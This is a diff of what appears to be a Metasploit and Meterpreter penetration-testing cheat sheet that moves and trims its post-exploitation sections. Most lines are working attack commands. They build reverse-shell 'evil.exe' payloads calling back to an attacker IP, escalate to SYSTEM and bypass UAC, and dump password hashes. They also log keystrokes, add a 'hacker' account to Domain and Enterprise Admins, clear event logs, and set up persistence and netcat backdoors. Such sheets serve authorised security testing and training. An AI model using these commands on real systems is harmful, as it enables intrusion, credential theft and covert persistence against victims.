@@ -196,6 +196,33 @@ set PAYLOAD windows/meterpreter/bind_tcp
 exploit
 ------------------------------------------------------------------------------------------------------
 
+# Post Exploitation using meterpreter
+
+run migrate                                   Create a new process and migrate to it.
+ps                                            Show running processes.
+sysinfo                                       Show host name and OS.
+getuid                                        Show current privileges.
+     if not NT AUTHORITY\SYSTEM
+     use priv                                 Escalate privileges.
+     getsystem                                If this fails: run post/windows/escalate/bypassuac
+     getuid                                   Privileges should now be NT AUTHORITY\SYSTEM
+screenshot                                    Take a photo of the desktop. 
+hashdump                                      Dump the password hashed.
+ipconfig                                      Look for dual-homed connections
+     if dual-homed
+     run autoroute -s <new CIDR range>
+     run autoroute -p                         Print routing table.
+route
+
+use incognito
+list_tokens -g
+list_tokens -u
+
+add_user hacker password -h <target IP>
+add_group_user "Enterprise Admins" hacker -h <target IP>
+add_group_user "Domain Admins" hacker -h <target IP>
+------------------------------------------------------------------------------------------------------
+
 # psexec
 
 use windows/smb/psexec
@@ -242,32 +269,6 @@ C:\WINDOWS\system32> net group "Domain Admins" hacker /add /domain
 The command completed successfully.
 ==========
 
-Post Exploitation using meterpreter
-
-run migrate                                   Create a new process and migrate to it.
-ps                                            Show running processes.
-sysinfo                                       Show host name and OS.
-getuid                                        Show current privileges.
-     if not NT AUTHORITY\SYSTEM
-     use priv                                 Escalate privileges.
-     getsystem
-     getuid                                   Privileges should now be NT AUTHORITY\SYSTEM
-screenshot                                    Take a photo of the desktop. 
-hashdump                                      Dump the password hashed.
-ipconfig                                      Look for dual-homed connections
-     if dual-homed
-     run autoroute -s <new CIDR range>
-     run autoroute -p                         Print routing table.
-route
-==========
-
-use incognito
-list_tokens -g
-list_tokens -u
-add_user hacker password -h <target IP>
-add_group_user "Enterprise Admins" hacker -h <target IP>
-add_group_user "Remote Access Users" hacker -h <target IP>
-
 (Open a new tab in Konsole)
      cp /pentest/windows-binaries/passwd-attack/fgdump.exe /tmp/
      cp /pentest/windows-binaries/passwd-attack/cachedump.exe /tmp/
@@ -307,7 +308,7 @@ meterpreter > clearev
 meterpreter > exit
 ==========
 
-# Malicious USB drive
+# Malicious USB Drive
 
 msfpayload windows/meterpreter/reverse_tcp LHOST=attackerIP LPORT=443 R | msfencode -t exe -e x86/shikata_ga_nai > evil.exe
 msfvenom -p windows/meterpreter/reverse_https -f exe LHOST=attackerIP LPORT=443 > evil.exe
@@ -321,32 +322,8 @@ set ExitOnSession false
 exploit -j
 ==========
 
-getpid
-ps
-migrate XX
-sysinfo
-getuid
-getprivs
-idletime
-getwd
-ls
-
-shell
-dir
-exit
-
-clearev
-
 upload <local path> <remote path>
 upload /root/putty.exe C:\\Documents\ and\ Settings\\Administrator\Desktop\
-==========
-
-hashdump
-<copy hashes>
-nano tmp
-<paste hashes>
-cat tmp | cut -d ":" -f4 > ntlm-hashes
-cat ntlm-hashes
 ==========
 
 run checkvm
@@ -398,37 +375,19 @@ set PAYLOAD windows/meterpreter/reverse_tcp
 set LHOST <attacker IP>
 set LPORT 21
 set ExitOnSession false
-# set AutoRunScript path to script you want to autorun after exploit is run 
+# set AutoRunScript path to script you want to autorun after exploit is fired 
 set AutoRunScript persistence -r <target IP> -p 21 -A -X -i 30 
 exploit -j -z
 ==========
 
 # Shows all the scripts
-run [tab]
-==========
-
-# persistence! broken ...if you use DNS name ..
-run persistence -r <target IP> -p 21 -A -X -i 30
+run <tab>
 ==========
 
 # Session hijack tokens
 
 use incognito
 impersonate_token "NT AUTHORITY\\SYSTEM"
-
-# Escalate to SYSTEM
-use priv
-getsystem
-
-execute -f cmd.exe -H -c -i -t
-execute -f cmd.exe -i -t
-==========
-
-# List top used apps
-run prefetchtool -x 20
-
-# List installed apps
-run prefetchtool -p
 ==========
 
 # Find and download files
@@ -444,11 +403,6 @@ download -r "%USERPROFILE%\\my documents"  ~/
 
 # Alternate to shell not SYSTEM
 # execute -f cmd.exe -H -c -i -t
-==========
-
-# rev shell the hard way
-
-run scheduleme -m 1 -u /tmp/nc.exe -o "-e cmd.exe -L -p 8080"
 ==========
 
 # An example of a run of the file to download via tftp of netcat and then running it as a backdoor.
@@ -480,27 +434,7 @@ at 19:00 /every:M,T,W,Th,F cmd /c start "%USERPROFILE%\evil.exe"
 SCHTASKS /Create /RU "SYSTEM" /SC MINUTE /MO 45 /TN FIREWALL /TR "%USERPROFILE%\evil.exe"  /ED 11/11/2011
 ==========
 
-# Post exploitation
-
-sysinfo
-getuid
-getpid
-ps
-idletime
-run checkvm
-ipconfig
-route
-run get_env
-run get_application_list
-run scraper
-=====
-
-cd /root/.msf4/logs/scripts/scrapper/<target IP>/
-ls
-cat hashes.txt
-=====
-
-getsystem -t 0
+getsystem
 getuid
 rev2self
 getuid
@@ -512,10 +446,6 @@ getdesktop
 keyscan_start		(Wait several minutes)
 keyscan_dump
 keyscan_stop
-
-getsystem
-     if this fails
-run post/windows/escalate/bypassuac
 ==========
 
 set options "InitialAutoRunScript=migrate -f", "AutoRunScript=post/multi/gather/run_console_rc_file RESOURCE=/opt/scripts/resource/post.rc
@@ -525,9 +455,3 @@ run post/windows/gather/credentials/vnc
 run post/windows/gather/cachedump
 use incognito
 list_tokens -u
- 
-add_user hacker password -h <target IP>
-add_localgroup_user Administrators hacker -h <target IP>
- 
-add_group_user "Domain Admins" hacker -h <target IP>
-add_group_user "Enterprise Admins" hacker -h <target IP>
